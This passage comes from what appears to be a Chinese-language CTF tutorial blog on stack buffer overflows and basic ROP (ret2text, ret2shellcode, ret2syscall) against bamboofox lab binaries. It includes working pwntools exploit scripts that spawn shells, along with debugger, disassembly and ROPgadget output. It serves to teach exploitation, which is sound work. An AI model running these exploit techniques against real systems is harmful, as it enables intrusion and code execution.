class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##coding=utf8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">## 构造与程序交互的对象</span></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./stack_example&#x27;</span>)</span><br><span class=\"line\">success_addr = <span class=\"number\">0x0804843b</span></span><br><span class=\"line\"><span class=\"comment\">## 构造payload</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x14</span> + <span class=\"string\">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class=\"line\"><span class=\"built_in\">print</span> p32(success_addr)</span><br><span class=\"line\"><span class=\"comment\">## 向程序发送字符串</span></span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\"><span class=\"comment\">## 将代码交互转换为手工交互</span></span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"><span class=\"comment\">#7.执行一波代码，可以得到</span></span><br><span class=\"line\">➜  stack-example python exp.py</span><br><span class=\"line\">[+] Starting local process <span class=\"string\">&#x27;./stack_example&#x27;</span>: pid <span class=\"number\">61936</span></span><br><span class=\"line\">;\\x84\\x0</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">aaaaaaaaaaaaaaaaaaaabbbb;\\x84\\x0</span><br><span class=\"line\">You Hava already controlled it.</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br><span class=\"line\">$ </span><br><span class=\"line\">[*] Process <span class=\"string\">&#x27;./stack_example&#x27;</span> stopped <span class=\"keyword\">with</span> exit code -<span class=\"number\">11</span> (SIGSEGV) (pid <span class=\"number\">61936</span>)</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> sending <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们确实已经执行success函数。</p>\n<p><strong>总结</strong></p>\n<p><strong>寻找危险函数</strong></p>\n<p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。</p>\n<p>常见的危险函数如下</p>\n<ul>\n<li><p>输入</p>\n</li>\n<li><ul>\n<li>gets，直接读取一行，忽略’\\x00’</li>\n<li>scanf</li>\n<li>vscanf</li>\n</ul>\n</li>\n<li><p>输出</p>\n</li>\n<li><ul>\n<li>sprintf</li>\n</ul>\n</li>\n<li><p>字符串</p>\n</li>\n<li><ul>\n<li>strcpy，字符串复制，遇到’\\x00’停止</li>\n<li>strcat，字符串拼接，遇到’\\x00’停止</li>\n<li>bcopy</li>\n</ul>\n</li>\n</ul>\n<p><strong>确定填充长度</strong></p>\n<p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>\n<ul>\n<li>相对于栈基地址的的索引</li>\n<li>相对应栈顶指针的索引</li>\n<li>直接地址索引</li>\n</ul>\n<p>其中相对于栈基地址的索引，可以直接通过查看EBP相对偏移获得；相对于栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种问题。通过绝对地址索引的，就相当于直接给定了地址。一般来说，我们会有如下的覆盖需求</p>\n<ul>\n<li><strong>覆盖函数返回地址</strong>，这时候就是直接看EBP即可。</li>\n<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>\n<li><strong>覆盖bss段某个变量的内容</strong>。</li>\n<li>等等</li>\n</ul>\n<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。</p>\n<h2 id=\"ROP大章\"><a href=\"#ROP大章\" class=\"headerlink\" title=\"ROP大章\"></a>ROP大章</h2><p><strong>基本ROP</strong>-<strong>ret2text</strong></p>\n<p>随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上(这一条之后不再重复提及)，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程。</strong>所谓gadgets就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>\n<p>之所以称之为ROP，是因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般得满足如下条件</p>\n<ul>\n<li>程序存在溢出，并且可以控制返回地址。</li>\n<li>可以找到满足条件的gadgets以及相应gadgets的地址。如果当程序开启了PIE保护，那么就必须想办法泄露gadgets的地址了。</li>\n</ul>\n<p>ret2text即需要我们控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是我们所要说的rop。</p>\n<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。    </p>\n<p><strong>bamboofox中介绍ROP时使用的ret2text的例子：</strong></p>\n<p>1.首先，查看一下程序的保护机制</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2text checksec ret2text</span><br><span class=\"line\">    Arch:     i386<span class=\"number\">-32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      <span class=\"function\">No <span class=\"title\">PIE</span> <span class=\"params\">(<span class=\"number\">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>可以看出程序是32位程序，其仅仅开启了栈不可执行保护。</p>\n<p>2.然后，我们在win操作机中使用IDA来查看源代码。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class=\"line\">  gets((<span class=\"keyword\">char</span> *)&amp;v4);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看出程序在主函数中使用了gets函数，显然存在栈溢出漏洞。</p>\n<p>3.此后又发现，在secure函数又发现了存在调用system(“/bin/sh”)的代码，那么如果我们直接控制程序返回至0x0804863A，那么就可以得到系统的shell了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:080485FD secure          proc near</span><br><span class=\"line\">.text:080485FD</span><br><span class=\"line\">.text:080485FD input           = dword ptr -10h</span><br><span class=\"line\">.text:080485FD secretcode      = dword ptr -0Ch</span><br><span class=\"line\">.text:080485FD</span><br><span class=\"line\">.text:080485FD                 push    ebp</span><br><span class=\"line\">.text:080485FE                 mov     ebp, esp</span><br><span class=\"line\">.text:08048600                 sub     esp, 28h</span><br><span class=\"line\">.text:08048603                 mov     dword ptr [esp], 0 ; timer</span><br><span class=\"line\">.text:0804860A                 call    _time</span><br><span class=\"line\">.text:0804860F                 mov     [esp], eax      ; seed</span><br><span class=\"line\">.text:08048612                 call    _srand</span><br><span class=\"line\">.text:08048617                 call    _rand</span><br><span class=\"line\">.text:0804861C                 mov     [ebp+secretcode], eax</span><br><span class=\"line\">.text:0804861F                 lea     eax, [ebp+input]</span><br><span class=\"line\">.text:08048622                 mov     [esp+4], eax</span><br><span class=\"line\">.text:08048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class=\"line\">.text:0804862D                 call    ___isoc99_scanf</span><br><span class=\"line\">.text:08048632                 mov     eax, [ebp+input]</span><br><span class=\"line\">.text:08048635                 cmp     eax, [ebp+secretcode]</span><br><span class=\"line\">.text:08048638                 jnz     short locret_8048646</span><br><span class=\"line\">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class=\"line\">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure>\n\n<p>4.下面就是我们如何构造payload了，首先需要确定的是我们能够控制的内存地址距离main函数的返回地址的字节数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:080486A7                 lea     eax, [esp+1Ch]</span><br><span class=\"line\">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class=\"line\">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure>\n\n<p>5.可以看到该字符串是通过相对于esp的索引，所以我们需要进行调试，将断点下在call处，查看esp，ebp，如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  b *0x080486AE</span><br><span class=\"line\">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class=\"line\">gef➤  r</span><br><span class=\"line\">There is something amazing here, do you know anything?</span><br><span class=\"line\">Breakpoint 1, 0x080486ae in main () at ret2text.c:24</span><br><span class=\"line\">24      gets(buf);</span><br><span class=\"line\">───────────────────────────────────────────────────────</span><br><span class=\"line\">────────────────[registers ]───────────────────────────</span><br><span class=\"line\">$eax   : 0xffffcd5c  →  0x08048329  →  &quot;__libc_start_main&quot;</span><br><span class=\"line\">$ebx   : 0x00000000</span><br><span class=\"line\">$ecx   : 0xffffffff</span><br><span class=\"line\">$edx   : 0xf7faf870  →  0x00000000</span><br><span class=\"line\">$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  &quot;__libc_start_main&quot;</span><br><span class=\"line\">$ebp   : 0xffffcdc8  →  0x00000000</span><br><span class=\"line\">$esi   : 0xf7fae000  →  0x001b1db0</span><br><span class=\"line\">$edi   : 0xf7fae000  →  0x001b1db0</span><br><span class=\"line\">$eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure>\n\n<p>6.可以看到esp为0xffffcd40，ebp为具体的payload如下0xffffcdc8，同时s相对于esp的索引为[esp+0x1c]，所以，s的地址为0xffffcd5c，所以s相对于ebp的偏移为0x6C，所以相对于返回地址的偏移为0x6c+4。</p>\n<p>最后的payload如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2text&#x27;</span>)</span><br><span class=\"line\">target = <span class=\"number\">0x804863a</span></span><br><span class=\"line\">sh.sendline(<span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">0x6c</span>+<span class=\"number\">4</span>) + p32(target))</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>基本ROP</strong>-<strong>ret2shellcode</strong></p>\n<p>ret2shellcode需要我们控制程序执行shellcode代码。而所谓的shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。<strong>一般来说，shellcode都需要我们自己去填充。这其实是另外一种典型的利用的方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>\n<p>而在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行shellcode，需要对应的binary文件没有开启NX保护。</p>\n<p><strong>以bamboofox中的ret2shellcode为例</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2shellcode checksec ret2shellcode</span><br><span class=\"line\">    Arch:     i386<span class=\"number\">-32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      <span class=\"function\">No <span class=\"title\">PIE</span> <span class=\"params\">(<span class=\"number\">0x8048000</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">    RWX:      Has RWX segments</span></span><br></pre></td></tr></table></figure>\n\n<p>2.我们再win操作机中使用IDA看一下程序。可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到buf2处。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No system for you this time !!!&quot;</span>);</span><br><span class=\"line\">  gets((<span class=\"keyword\">char</span> *)&amp;v4);</span><br><span class=\"line\">  <span class=\"built_in\">strncpy</span>(buf2, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)&amp;v4, <span class=\"number\">0x64</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bye bye ~&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.ida中双击buf2，可知buf2在bss段。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:0804A080   public buf2</span><br><span class=\"line\">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure>\n\n<p>4.这时，我们简单的调试下程序，看看这一个bss段是否可执行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  b main</span><br><span class=\"line\">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class=\"line\">gef➤  r</span><br><span class=\"line\">Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class=\"line\">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class=\"line\">8       setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class=\"line\">────────────[ source:ret2shellcode.c+8 ]────────────</span><br><span class=\"line\">      6  int main(void)</span><br><span class=\"line\">      7  &#123;</span><br><span class=\"line\"> →    8      setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class=\"line\">      9      setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class=\"line\">     10  </span><br><span class=\"line\">────────────────────────────────────[ trace ]────────────────────────</span><br><span class=\"line\">[#0] 0x8048536 → Name: main()</span><br><span class=\"line\">─────────────────────────────────────────────────────</span><br><span class=\"line\">gef➤  vmmap</span><br><span class=\"line\">Start      End        Offset     Perm Path</span><br><span class=\"line\">0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class=\"line\">0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class=\"line\">0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class=\"line\">0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7faf000 0xf7fb2000 0x00000000 rwx</span><br><span class=\"line\">0xf7fd3000 0xf7fd5000 0x00000000 rwx</span><br><span class=\"line\">0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]</span><br><span class=\"line\">0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]</span><br><span class=\"line\">0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffb000 0xf7ffc000 0x00000000 rwx</span><br><span class=\"line\">0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure>\n\n<p>5.通过vmmap，我们可以看到bss段对应的段具有可执行权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br></pre></td></tr></table></figure>\n\n<p>6.那么这次我们就控制程序执行shellcode，也就是读入shellcode，然后控制程序执行bss段处的shellcode。其中，相应的偏移计算类似于ret2text中的例子。</p>\n<p>具体的payload如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">buf2_addr = <span class=\"number\">0x804a080</span></span><br><span class=\"line\">sh.sendline(shellcode.ljust(<span class=\"number\">112</span>, <span class=\"string\">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>基本ROP</strong>-<strong>ret2syscall</strong></p>\n<p>ret2syscall需要我们控制程序执行系统调用，获取shell。</p>\n<p>这里我们以bamboofox中的ret2syscall为例</p>\n<p>1.首先检测程序开启的保护。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall checksec rop</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n\n<p>2.可以看出，源程序为32位，开启了NX保护。接下来利用IDA来查看源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;What do you plan to do?&quot;</span>);</span><br><span class=\"line\">  gets(&amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得v4相对于ebp的偏移为108。所以我们需要覆盖的返回地址相对于v4的偏移为112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得shell，所以我们利用程序中的gadgets来获得shell，而对应的shell获取则是利用系统调用。</p>\n<p>4.简单地说，只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们在执行int 0x80就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取shell</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execve(<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>)</span><br></pre></td></tr></table></figure>\n\n<p>其中，该程序是32位，所以我们需要使得</p>\n<ul>\n<li>系统调用号即eax应该为0xb</li>\n<li>第一个参数即ebx应该指向/bin/sh的地址，其实执行sh的地址也可以</li>\n<li>第二个参数即ecx应该为0</li>\n<li>第三个参数edx应该为0</li>\n</ul>\n<p>而我们如何控制这些寄存器的值 呢？这里就需要使用gadgets。比如说，现在栈顶是10，那么如果此时执行了pop eax，那么现在eax的值就为10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在gadgets最后使用ret来再次控制程序执行流程的原因。具体寻找gadgets的方法，我们可以使用ropgadgets这个工具。</p>\n<p>5.首先，我们来寻找控制eax的gadgets</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class=\"line\">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x080bb196 : pop eax ; ret</span><br><span class=\"line\">0x0807217a : pop eax ; ret 0x80e</span><br><span class=\"line\">0x0804f704 : pop eax ; ret 3</span><br><span class=\"line\">0x0809ddd9 : pop es  ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>\n\n<p>6.可以看到有上述几个都可以控制eax，那我就选取第二个来作为我的gadgets。</p>\n<p>类似的，我们可以得到控制其它寄存器的gadgets</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class=\"line\">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0809ddda : pop eax ; pop ebx ; pop esi ; 